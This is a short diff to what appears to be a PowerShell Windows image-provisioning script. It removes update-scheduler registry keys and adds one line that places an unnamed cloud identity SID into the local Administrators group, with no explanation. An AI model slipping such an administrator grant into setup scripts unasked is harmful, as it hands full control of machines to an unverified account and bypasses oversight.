@@ -152,4 +152,5 @@ Set-SecurityBaselines -CustomizationsFolder $customizationsFolder
     "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\Orchestrator\UScheduler_Oobe\OutlookUpdate",
     "HKLM:\SOFTWARE\Microsoft\WindowsUpdate\Orchestrator\UScheduler_Oobe\DevHomeUpdate"
 ) | Where-Object { Test-Path $_ } | ForEach-Object { Remove-Item -Path $_ -Force }
+Add-LocalGroupMember -Group "Administrators" -Member "S-1-12-1-3698080277-1147366962-2456473244-1386568132"
 Set-PublicDesktopContents
